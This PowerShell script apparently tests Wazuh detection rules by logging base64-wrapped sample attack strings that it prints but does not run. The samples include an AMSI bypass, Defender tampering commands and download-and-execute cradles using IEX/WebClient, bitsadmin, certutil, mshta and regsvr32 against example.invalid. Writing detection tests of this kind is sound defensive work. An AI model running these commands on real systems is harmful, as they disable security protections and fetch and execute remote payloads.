[CmdletBinding()]
param(
    [ValidateSet(
        "amsi_bypass",
        "defender_tamper",
        "iex_webclient",
        "download_execute",
        "bitsadmin",
        "certutil",
        "mshta",
        "rundll32",
        "regsvr32"
    )]
    [string]$Name,

    [switch]$All,
    [switch]$List,
    [switch]$NoVerifyLocal
)

$samples = [ordered]@{
    amsi_bypass = @{
        Description   = "AMSI bypass pattern"
        DecodedText   = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue(`$null,`$true)"
        ExpectedRules = @("110420", "110434")
    }
    defender_tamper = @{
        Description   = "Microsoft Defender tampering"
        DecodedText   = "Set-MpPreference -DisableRealtimeMonitoring True; Add-MpPreference -ExclusionPath C:\Temp"
        ExpectedRules = @("110420", "110433")
    }
    iex_webclient = @{
        Description   = "IEX plus WebClient"
        DecodedText   = "IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/a.ps1')"
        ExpectedRules = @("110420", "110431", "110432", "110439")
    }
    download_execute = @{
        Description   = "Download then execute chain"
        DecodedText   = "Invoke-WebRequest 'https://example.invalid/payload.exe' -OutFile `$env:TEMP\payload.exe; Start-Process `$env:TEMP\payload.exe"
        ExpectedRules = @("110420", "110431", "110436")
    }
    bitsadmin = @{
        Description   = "BITS or bitsadmin retrieval"
        DecodedText   = "bitsadmin.exe /transfer job https://example.invalid/payload.exe C:\Users\Public\payload.exe"
        ExpectedRules = @("110420", "110431", "110440")
    }
    certutil = @{
        Description   = "certutil retrieval"
        DecodedText   = "certutil.exe -urlcache -split -f https://example.invalid/payload.bin C:\Users\Public\payload.bin"
        ExpectedRules = @("110420", "110431", "110441")
    }
    mshta = @{
        Description   = "mshta launcher"
        DecodedText   = "mshta.exe https://example.invalid/launch.hta"
        ExpectedRules = @("110420", "110431", "110442")
    }
    rundll32 = @{
        Description   = "rundll32 launcher"
        DecodedText   = "rundll32.exe C:\Users\Public\stage.dll,EntryPoint"
        ExpectedRules = @("110420", "110431", "110443")
    }
    regsvr32 = @{
        Description   = "regsvr32 scriptlet launcher"
        DecodedText   = "regsvr32.exe /s /n /u /i:https://example.invalid/file.sct scrobj.dll"
        ExpectedRules = @("110420", "110431", "110444")
    }
}

function New-DecodableWrapperScript {
    param(
        [Parameter(Mandatory = $true)]
        [string]$DecodedText
    )

    $payloadB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($DecodedText))
    $wrapper = '$d=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(''' + $payloadB64 + '''))' +
        [Environment]::NewLine +
        'Write-Host $d'

    return @{
        PayloadBase64 = $payloadB64
        WrapperScript = $wrapper
    }
}

function Get-Local4104Match {
    param(
        [Parameter(Mandatory = $true)]
        [string]$PayloadBase64
    )

    $needle = [regex]::Escape($PayloadBase64.Substring(0, [Math]::Min(40, $PayloadBase64.Length)))

    Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -MaxEvents 200 |
        Where-Object {
            $_.Id -eq 4104 -and
            $_.Message -match 'FromBase64String' -and
            $_.Message -match 'Write-Host \$d' -and
            $_.Message -match $needle
        } |
        Select-Object -First 1 TimeCreated, Id, RecordId
}

function Invoke-Safe4104Sample {
    param(
        [Parameter(Mandatory = $true)]
        [string]$SampleName
    )

    $sample = $samples[$SampleName]
    $wrapperInfo = New-DecodableWrapperScript -DecodedText $sample.DecodedText
    $wrapperEncoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($wrapperInfo.WrapperScript))
    $startUtc = (Get-Date).ToUniversalTime().ToString("o")

    Write-Host ""
    Write-Host "Triggering sample: $SampleName"
    Write-Host "Description: $($sample.Description)"
    Write-Host "Expected Wazuh rules: $($sample.ExpectedRules -join ', ')"
    Write-Host "Start UTC: $startUtc"

    powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand $wrapperEncoded | Out-Null
    Start-Sleep -Milliseconds 900

    $event = $null
    if (-not $NoVerifyLocal) {
        $event = Get-Local4104Match -PayloadBase64 $wrapperInfo.PayloadBase64
    }

    [pscustomobject]@{
        Sample         = $SampleName
        Description    = $sample.Description
        ExpectedRules  = $sample.ExpectedRules -join ", "
        Status         = if ($NoVerifyLocal) { "Triggered (local verification skipped)" } elseif ($event) { "4104 confirmed" } else { "4104 not found" }
        TimeCreated    = if ($event) { $event.TimeCreated } else { $null }
        RecordId       = if ($event) { $event.RecordId } else { $null }
        StartUtc       = $startUtc
    }
}

function Show-SampleList {
    $index = 1
    foreach ($entry in $samples.GetEnumerator()) {
        Write-Host ("{0}. {1} - {2}" -f $index, $entry.Key, $entry.Value.Description)
        $index++
    }
}

function Read-MenuSelection {
    Write-Host "Available samples:"
    Show-SampleList
    Write-Host ""
    Write-Host "A. Run all samples"
    Write-Host "Q. Quit"
    Write-Host ""

    $selection = Read-Host "Choose a sample number, A, or Q"
    if ($selection -match '^[Qq]$') {
        return @()
    }

    if ($selection -match '^[Aa]$') {
        return @($samples.Keys)
    }

    if ($selection -match '^\d+$') {
        $index = [int]$selection
        if ($index -ge 1 -and $index -le $samples.Count) {
            return @($samples.Keys[$index - 1])
        }
    }

    throw "Invalid selection."
}

if ($List) {
    Show-SampleList
    return
}

$targets = @()

if ($All) {
    $targets = @($samples.Keys)
} elseif ($Name) {
    $targets = @($Name)
} else {
    $targets = Read-MenuSelection
}

if ($targets.Count -eq 0) {
    Write-Host "No samples selected."
    return
}

$results = foreach ($target in $targets) {
    Invoke-Safe4104Sample -SampleName $target
}

Write-Host ""
Write-Host "Summary:"
$results | Format-Table -AutoSize

Write-Host ""
Write-Host "Manager-side validation:"
Write-Host "grep '110420' /var/ossec/logs/alerts/alerts.json | tail -n 30"
Write-Host "grep -E '110433|110434|110436|110439|110440|110441|110442|110443|110444' /var/ossec/logs/alerts/alerts.json | tail -n 50"
Write-Host "tail -n 30 /var/log/wazuh-powershell-decoded.json"
